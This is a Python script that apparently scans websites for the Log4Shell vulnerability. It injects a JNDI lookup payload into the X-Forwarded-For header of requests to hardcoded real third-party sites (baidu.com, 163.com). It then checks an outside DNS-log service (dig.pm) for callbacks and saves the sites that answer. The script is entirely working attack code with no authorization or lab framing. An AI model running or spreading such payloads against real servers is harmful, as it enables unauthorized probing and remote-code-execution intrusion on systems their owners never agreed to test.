# coding:utf-8
import requests
import urllib3
import uuid
import random

urllib3.disable_warnings()

def main():
    ## get dnslog subdomain
    dnslog_base = "https://dig.pm/"
    dnslog_domains = requests.get("{0}get_domain".format(dnslog_base)).json()
    if len(dnslog_domains) < 1:
        exit("Maybe `dig.pm` is down..")
    dnslog_domain = random.choice(dnslog_domains)
    dnslog_subdomain = requests.post(
        "{0}get_sub_domain".format(dnslog_base), data={"domain": dnslog_domain}
    ).json()
    print(dnslog_subdomain)
    ## send payload
    targets = ["http://baidu.com/?key=", "http://163.com"]
    uuids = {}
    print(" send payload begin ".center(50, "-"))
    for url in targets:
        url = url.strip()
        uid = uuid.uuid4().hex
        uuids[url] = uid
        headers = {
            "X-Forwarded-For": "${{jndi:rmi://{0}.{1}/test}}".format(
                uid, dnslog_subdomain["domain"]
            )
        }
        try:
            print("[-] Send payload to {0}".format(url))
            requests.get(url, verify=False, headers=headers, timeout=5)
        except:
            pass
    print(" send payload finished ".center(50, "-"))
    print("\n")
    print("---".center(50, "-"))
    success = []
    res = requests.post(
        "{0}get_results".format(dnslog_base),
        data={"domain": dnslog_domain, "token": dnslog_subdomain["token"]},
    ).text
    ## check result
    for target in uuids:
        if uuids[target] in res:
            print("[+] {0} exists log4shell !!".format(target))
            success.append(target)
        else:
            pass
    print("---".center(50, "-"))
    filename = uuid.uuid1().hex + ".txt"
    if len(success)>0:
        with open(filename, "w") as f:
            f.write("\n".join(success))
            print("[*] put res in {0}".format(filename))


if __name__ == "__main__":
    main()
